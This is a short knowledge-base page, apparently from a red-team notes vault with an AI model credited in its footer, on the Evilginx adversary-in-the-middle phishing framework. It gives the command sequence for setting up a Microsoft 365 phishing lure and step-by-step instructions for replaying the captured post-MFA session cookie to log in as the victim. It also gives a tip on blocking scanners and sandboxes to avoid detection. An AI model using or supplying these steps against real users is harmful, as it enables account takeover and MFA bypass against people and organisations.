# Evilginx2

**Tags:** `#evilginx2` `#aitm` `#phishing` `#mfabypass` `#sessionhijacking` `#cloud`

Adversary-in-the-middle (AiTM) phishing framework (kgretzky) built on an embedded nginx reverse proxy. Sits between the victim and the real identity provider, transparently proxying the entire login flow — including MFA — while capturing the resulting session cookie/token. Because the session is captured *after* MFA completes, it bypasses MFA outright rather than trying to avoid or exploit it. Driven by "phishlets" (YAML configs describing the target site's login flow); a Microsoft 365/Entra ID phishlet is one of the most commonly used against this service.

**Source:** https://github.com/kgretzky/evilginx2 (the current major version is **evilginx v3** at `github.com/kgretzky/evilginx` — same phishlets/lures workflow shown below)
**Install:** download a release binary or build from source (Go); requires a domain and valid TLS cert for the phishing site.

> [!warning] **Phishlets are not bundled.** Evilginx removed the built-in M365/O365 phishlets from the core repo (abuse); `phishlets hostname microsoft365 ...` assumes you've placed a phishlet named `microsoft365` in the phishlets dir — source it separately and confirm the name with `phishlets` (the file's basename is the name you reference).

```bash
# One-time setup — your phishing domain + this box's public IP (DNS A/NS must point here)
config domain attacker-domain.com
config ipv4 <external-ip>

# Load a Microsoft 365 phishlet and start a phishing lure
phishlets hostname microsoft365 phish.attacker-domain.com
phishlets enable microsoft365
lures create microsoft365
lures get-url 0
# Send the generated URL to the target; captured sessions appear under `sessions`
```

### Using the Captured Session (the payoff)

Capturing the cookie is only half of it — you then **replay** it to ride the already-
MFA'd session:

```
sessions              # list captured sessions
sessions <id>         # show the victim's tokens + the captured cookie JSON
```

Copy that cookie JSON into a browser with a cookie-import extension (e.g. Cookie-Editor)
on the real site (`login.microsoftonline.com`), refresh, and you're logged in **as the
victim with MFA already satisfied** — no password, no second factor. Do this before the
session/refresh token expires.

> [!tip] Point unused paths and scanner traffic away with Evilginx's `blacklist`
> (`blacklist unauth`) so sandboxes/crawlers get a redirect instead of burning your phishlet.

> [!note] **See also** — [[Services/Active Directory/Entra ID|Entra ID]] MFA Bypass section (Adversary-in-the-Middle Phishing); [[Services/Remote Access/Cisco AnyConnect|Cisco AnyConnect]] — cloned SSL VPN portal phishlet capturing creds + session tokens.

---

*Created: 2026-07-27*
*Updated: 2026-09-28*
*Model: claude-opus-4-8*
